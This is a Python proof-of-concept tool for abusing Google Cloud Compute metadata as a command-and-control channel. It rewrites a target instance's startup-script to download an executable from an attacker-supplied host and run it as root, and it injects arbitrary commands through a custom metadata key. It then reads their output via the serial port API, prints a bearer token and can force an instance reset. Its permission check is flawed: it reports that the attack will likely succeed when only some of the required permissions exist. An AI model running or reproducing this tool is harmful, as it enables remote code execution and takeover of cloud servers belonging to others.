#!/usr/bin/env python3
#
# gce-s3r1al.py
# Twitter: @mgior
# Blog: https://mgior.com/
#
# Based on research conducted by Mitiga
# Reference: https://www.mitiga.io/blog/misconfiguration-hidden-dangers-cloud-control-plane
#
# This script is intended to be used to set and modify metadata values/keys for
# arbitrary command execution as well as "C2" or "exfiltration" functionality by reading 
# the output of commands issued via GCP's serial output API.
#
# This tool assumes you already have am exported API key (i.e.: Service Account JSON key)
# Feel free to modify as needed.
#
# This is for testing and educational purposes only and comes with no warranty.
#

import argparse
import google.auth
import google.auth.transport.requests
from googleapiclient import discovery
from google.oauth2 import service_account

class colors:
    WARN = '\033[93m'
    OK = '\033[92m'
    BAD = '\033[91m'
    END = '\033[0m'

def exploitMetadata(payloadHost, payloadPort, payloadName, credsFile, gcpProject, computeZone, computeInstance):
    # Setup authentication
    print(f"{colors.OK}[+] Modifying startup metadata on {computeInstance}...{colors.END}\n")
    scopes = ['https://www.googleapis.com/auth/cloud-platform']
    credentials = service_account.Credentials.from_service_account_file(credsFile, scopes=scopes)
    service = discovery.build('compute', 'v1', credentials=credentials)

    # Extract Bearer token from service_account.json file to use 'curl' against the serialPort API later
    print(f"{colors.OK}[+] Getting Bearer token from {credsFile}{colors.END}")
    auth_req = google.auth.transport.requests.Request()
    credentials.refresh(auth_req)
    token = credentials.token
    bearer = token.strip(".")
    print(f"{colors.OK}[!] Bearer Token: {colors.END}{bearer}\n")

    # Get metadata fingerprint
    print(f"{colors.OK}[+] Getting metadata fingerprint...{colors.END}")
    instanceDetails = service.instances().get(project=gcpProject, zone=computeZone, instance=computeInstance).execute()
    fingerprint = instanceDetails['metadata']['fingerprint']
    print(f"{colors.OK}[+] Got fingerprint: {colors.END}{fingerprint}\n")
    
    # Set new metadata key/value on target compute instance with payload
    print(f"{colors.OK}[+] Modifying 'startup-script' metadata key value to new payload...{colors.END}")
    print(f"{colors.OK}[+] Creating metadata key 's3r1al' for arbitrary command usage...{colors.END}\n")
    startupPayload = { 
        "fingerprint":f"{fingerprint}", 
        "items": [
            {
                "key":"startup-script",
                "value": f"#!/bin/bash\ncurl {payloadHost}:{payloadPort}/{payloadName} > /root/{payloadName}\nchmod +x /root/{payloadName}\ncd /root/ && ./{payloadName}"
                },
                {
                "key":"s3r1al",
                "value":"whoami"
            }
        ]
    }
    instance = service.instances().setMetadata(project=gcpProject, zone=computeZone, instance=computeInstance, body=startupPayload)
    instance.execute()

    # Get metadata results from instance to verify new key:value are present
    getMetadata = service.instances().get(project=gcpProject, zone=computeZone, instance=computeInstance).execute()
    print(f"{colors.OK}[!] New metadata added (s3r1al might not appear; run again to verify): \n{colors.END}")
    print(getMetadata['metadata'], "\n")

    # Validate reset of compute instance now
    resetInstance = input(f"{colors.WARN}[?] Reset instance {computeInstance} now? (Y/N) > {colors.END}")
    if resetInstance == "Y" or resetInstance == "y":
        print(f"\n{colors.WARN}[!] Resetting compute instance {computeInstance} now!{colors.END}")
        instanceReset = service.instances().reset(project=gcpProject, zone=computeZone, instance=computeInstance)
        instanceReset.execute()
    elif resetInstance == "N" or resetInstance == "n":
        print(f"\n{colors.WARN}[*] {computeInstance} will not be reset now - await next reboot for startup script to execute.{colors.END}\n")
    else:
        print(f"\n{colors.WARN}[*] {computeInstance} will not be reset now - await next reboot for startup script to execute.{colors.END}\n")
        
    print(f"{colors.OK}[!] Use the GCP Compute API to read command output sent to the serial port{colors.END}")
    print(f"Use: curl -XGET -H \"Authorization: Bearer {bearer}\" https://compute.googleapis.com/compute/v1/projects/{gcpProject}/zones/{computeZone}/instances/{computeInstance}/serialPort?port=3")


def modifyMetadataCmd(credsFile, gcpProject, computeZone, computeInstance):
    # Setup authentication
    print(f"{colors.OK}[+] Modifying 's3r1al' key value on {computeInstance}...{colors.END}\n")
    credentials = service_account.Credentials.from_service_account_file(credsFile)
    service = discovery.build('compute', 'v1', credentials=credentials)

    # Get metadata fingerprint
    print(f"{colors.OK}[+] Getting metadata fingerprint...{colors.END}")
    instanceget = service.instances().get(project=gcpProject, zone=computeZone, instance=computeInstance).execute()
    fingerprint = instanceget['metadata']['fingerprint']
    print(f"{colors.OK}[+] Got fingerprint: {colors.END}{fingerprint}\n")
    
    # Get new command via STDIN
    newCommand = input(f"{colors.WARN}[?] Enter new command > {colors.END}")

    # Set new metadata key/value on target compute instance with payload
    serialUpdate = { 
        "fingerprint":f"{fingerprint}", 
        "items": [
            {
                "key":"s3r1al",
                "value":f"{newCommand}"
            }
        ]
    }
    instance = service.instances().setMetadata(project=gcpProject, zone=computeZone, instance=computeInstance, body=serialUpdate)
    instance.execute()

    print(f"\n{colors.OK}[+] Modified! Check output using 'serialPort?port=3'{colors.END}")


def checkApiPermissions(credsFile):
    credentials = service_account.Credentials.from_service_account_file(credsFile)
    service = discovery.build('iam', 'v1', credentials=credentials)

    # Check against the 'compute.admin' GCP role
    name = "roles/compute.admin"
    request = service.roles().get(name=name)
    response = request.execute()

    # Check for getSerialPortOutput permission in response
    if "compute.instances.getSerialPortOutput" not in response['includedPermissions']:
        print(f"{colors.BAD}[!] The role 'compute.instances.getSerialPortOutput was not found!{colors.END}")
        serialPortOutput = False
    else:
        print(f"{colors.OK}[+] The role 'compute.instances.getSerialPortOutput' was found!{colors.END}")
        serialPortOutput = True

    # Check for setMetaData permission in response
    if "compute.instances.setMetadata" not in response['includedPermissions']:
        print(f"{colors.BAD}[!] The role 'compute.instanes.setMetaData' was not found!{colors.END}")
        setMetadata = False
    else:
        print(f"{colors.OK}[+] The role 'compute.instances.setMetaData' was found!{colors.END}")
        setMetadata = True

    # Check for reset permission in response
    if "compute.instances.reset" not in response['includedPermissions']:
        print(f"{colors.BAD}[!] The role 'compute.instances.reset' was not found!{colors.END}")
        computeReset = False
    else:
        print(f"{colors.OK}[+] The role 'compute.instances.reset' was found!{colors.END}")
        computeReset = True

    # Determine attack likelihood
    if not any ((serialPortOutput, setMetadata, computeReset)):
        print(f"\n{colors.BAD}[!] Not all required permissions were found - attack will likely fail!{colors.END}")
    else:
        print(f"\n{colors.OK}[+] All required permissions were found - attack will likely succeed!{colors.END}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC script to abuse GCP Compute API's for C2 functionality")

    parser.add_argument('action', choices=['check', 'exploit', 'modify'], help="Either 'check' if required roles are present, 'exploit' to modify startup-script metadata key, or 'modify' to change arbitrary metadata key's command")
    parser.add_argument('--host', help="IP address or FQDN of server hosting payload")
    parser.add_argument('--port', help="Port on server hosting payload (i.e.: 80)")
    parser.add_argument('--payloadfile', help="Name of the payload file to download from server")
    parser.add_argument('--authfile', help="Provide API key of target GCP IAM user",)
    parser.add_argument('--project', help="Specify the GCP project where the compute resource resides")
    parser.add_argument('--zone', help="Specify the zone where the compute resource is hosted")
    parser.add_argument('--instance', help="Specify the name compute instance")

    args = parser.parse_args()
    action = args.action

    if action == 'exploit':
        exploitMetadata(args.host, args.port, args.payloadfile, args.authfile, args.project, args.zone, args.instance)
    elif action == 'check':
        checkApiPermissions(args.authfile)
    elif action == 'modify':
        modifyMetadataCmd(args.authfile, args.project, args.zone, args.instance)
